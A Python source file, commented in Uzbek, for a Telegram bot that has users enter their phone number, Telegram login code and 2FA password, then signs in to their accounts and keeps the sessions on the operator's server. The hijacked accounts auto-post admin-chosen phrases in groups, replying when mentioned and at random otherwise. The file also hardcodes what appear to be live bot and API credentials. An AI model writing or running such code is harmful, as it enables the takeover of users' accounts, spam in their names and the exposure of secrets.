import asyncio
import logging
import random
import os

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)

from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError
)

# ----------------- SOZLAMALAR -----------------
BOT_TOKEN = "8751865013:AAHqEWU3ygRg5mA4Wd1gYNaQEZB0UFaMRUw"  # BotFather'dan olingan token
API_ID = 34760616  # my.telegram.org saytidan olingan API ID (butun son)
API_HASH = "1bea40adc634f0205e907f0a1873e7b8"  # my.telegram.org saytidan olingan API HASH
ADMIN_ID = 7651404790  # Sizning Telegram ID'ingiz (integer)

# Sessiyalar saqlanadigan papka
if not os.path.exists('sessions'):
    os.makedirs('sessions')

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Ma'lumotlarni xotirada saqlash
phrases = []          # Boshida gaplar bo'lmaydi
active_clients = {}   # Ulangan userbotlar ro'yxati {user_id: client}

# FSM (Holatlar)
class AccountConnect(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

class AdminStates(StatesGroup):
    waiting_for_phrase = State()

# ----------------- TUGMALAR -----------------
def get_user_keyboard():
    kb = [
        [KeyboardButton(text="📱 Akkauntni ulash")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_admin_keyboard():
    kb = [
        [InlineKeyboardButton(text="📊 Statistika", callback_data="stats")],
        [InlineKeyboardButton(text="➕ Gap qo'shish", callback_data="add_phrase")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# ----------------- COMMAND HANDLERS -----------------
@dp.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "👋 **Xush kelibsiz!**\n\nAkkauntingizni ulash uchun pastdagi tugmani bosing:",
        reply_markup=get_user_keyboard(),
        parse_mode="Markdown"
    )

@dp.message(Command("admin"))
async def admin_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("👑 **Admin Panel:**", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

# ----------------- ADMIN PANEL -----------------
@dp.callback_query(F.data == "stats")
async def show_stats(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    
    msg = (
        f"📊 **BOT STATISTIKASI**\n\n"
        f"👑 **Admin:** `{ADMIN_ID}`\n"
        f"📱 **Ulangan akkauntlar:** `{len(active_clients)}` ta\n"
        f"💬 **Bazadagi gaplar:** `{len(phrases)}` ta\n"
        f"⚙️ **Status:** 🟢 Faol"
    )
    await call.message.edit_text(msg, reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@dp.callback_query(F.data == "add_phrase")
async def add_phrase_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminStates.waiting_for_phrase)
    await call.message.answer("➕ **Yangi gapni yoki premium emojili matnni yuboring:**")

@dp.message(AdminStates.waiting_for_phrase)
async def save_phrase(message: types.Message, state: FSMContext):
    # Telegram'dagi barcha formatlar va premium emojilar saqlanadi
    phrase_text = message.text or message.caption or ""
    if phrase_text:
        phrases.append(phrase_text)
        await state.clear()
        await message.answer(
            f"✅ **Gap muvaffaqiyatli saqlandi!**\n\nJami gaplar: `{len(phrases)}` ta.",
            reply_markup=get_admin_keyboard(),
            parse_mode="Markdown"
        )
    else:
        await message.answer("❌ Matn kiritilmadi. Qaytadan yuboring:")

# ----------------- AKKAUNT ULASH (USERBOT) -----------------
@dp.message(F.text == "📱 Akkauntni ulash")
async def start_connect(message: types.Message, state: FSMContext):
    await state.set_state(AccountConnect.waiting_for_phone)
    await message.answer(
        "📲 **Telefon raqamingizni xalqaro formatda yuboring:**\n\n"
        "Masalan: `+998978002727`",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )

@dp.message(AccountConnect.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    
    if not phone.startswith("+"):
        await message.answer("❌ Raqam `+` bilan boshlanishi kerak! Masalan: `+998978002727`\n\nQaytadan kiriting:")
        return

    session_path = f"sessions/user_{message.from_user.id}"
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        await client.connect()
        res = await client.send_code_request(phone)
        
        # Ma'lumotlarni FSM xotirasiga saqlash
        await state.update_data(
            phone=phone,
            phone_code_hash=res.phone_code_hash,
            session_path=session_path
        )
        
        # Client obyektini vaqtincha saqlash
        active_clients[f"temp_{message.from_user.id}"] = client
        
        await state.set_state(AccountConnect.waiting_for_code)
        await message.answer(
            "📩 **Telegram tasdiqlash kodi yuborildi!**\n\n"
            "⚠️ Kodingizni rasmiy Telegram ilovasidagi **'Telegram'** chatidan oling va shu yerga yozing:",
            parse_mode="Markdown"
        )
    except PhoneNumberInvalidError:
        await client.disconnect()
        await message.answer("❌ Telefon raqami noto'g'ri. Qaytadan kiriting:")
    except Exception as e:
        await client.disconnect()
        await state.clear()
        await message.answer(f"❌ Kutilmagan xatolik: `{e}`\n\n/start bosib qayta urinib ko'ring.", parse_mode="Markdown")

@dp.message(AccountConnect.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip().replace(" ", "")
    data = await state.get_data()
    
    temp_key = f"temp_{message.from_user.id}"
    client: TelegramClient = active_clients.get(temp_key)

    if not client:
        await message.answer("❌ Ulanish vaqti tugadi. Qaytadan /start bosing.")
        await state.clear()
        return

    try:
        await client.sign_in(
            phone=data['phone'],
            code=code,
            phone_code_hash=data['phone_code_hash']
        )
        
        # Userbot uchun hodisalarni biriktirish (Guruhlarda avto-javob qaytarish va utag)
        setup_userbot_events(client)
        
        # Ulangan akkni doimiy saqlash
        active_clients[message.from_user.id] = client
        active_clients.pop(temp_key, None)

        await state.clear()
        await message.answer(
            "✅ **Akkauntingiz muvaffaqiyatli ulandi!**\n\n"
            "Endi ushbu akkaunt guruhlarda avtomatik ravishda xabarlarga va utag (mention) qilinganda javob beradi.",
            reply_markup=get_user_keyboard(),
            parse_mode="Markdown"
        )

    except SessionPasswordNeededError:
        await state.set_state(AccountConnect.waiting_for_2fa)
        await message.answer("🔐 **Akkauntingizda 2FA (Ikki bosqichli parol) mavjud.**\n\nParolingizni kiriting:")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer("❌ Kiritilgan kod noto'g'ri yoki muddati o'tgan! Qaytadan kiriting:")
    except Exception as e:
        await message.answer(f"❌ Xatolik: `{e}`", parse_mode="Markdown")

@dp.message(AccountConnect.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    password = message.text.strip()
    temp_key = f"temp_{message.from_user.id}"
    client: TelegramClient = active_clients.get(temp_key)

    if not client:
        await message.answer("❌ Qaytadan /start bosing.")
        await state.clear()
        return

    try:
        await client.sign_in(password=password)
        
        setup_userbot_events(client)
        active_clients[message.from_user.id] = client
        active_clients.pop(temp_key, None)

        await state.clear()
        await message.answer("✅ **Akkaunt 2FA orqali muvaffaqiyatli ulandi!**", reply_markup=get_user_keyboard(), parse_mode="Markdown")
    except Exception as e:
        await message.answer(f"❌ Noto'g'ri parol: `{e}`\nQaytadan kiriting:", parse_mode="Markdown")

# ----------------- USERBOT HODISALARI (GURUH VA UTAG) -----------------
def setup_userbot_events(client: TelegramClient):
    @client.on(events.NewMessage(chats=None))
    async def userbot_handler(event):
        # Faqat guruh va superguruhlarda ishlash
        if not (event.is_group or event.is_channel):
            return

        # 1. Agar foydalanuvchini utag (mention/reply) qilishsa yoki guruhga xabar tushsa
        me = await client.get_me()
        is_mentioned = event.mentioned or (event.reply_to_msg_id and event.is_private is False)
        
        # Bazada gaplar bo'lsa javob beradi
        if phrases:
            random_phrase = random.choice(phrases)
            
            # Utag qilingan bo'lsa reply qilib javob beradi
            if is_mentioned:
                await event.reply(random_phrase)
            else:
                # Oddiy guruh xabarlariga 20% ehtimollik bilan javob qaytarish
                if random.random() < 0.2:
                    await event.respond(random_phrase)

# ----------------- ASOSIY SHISH ISHGA TUSHRISH -----------------
async def main():
    logging.basicConfig(level=logging.INFO)
    print("Bot ishga tushmoqda...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
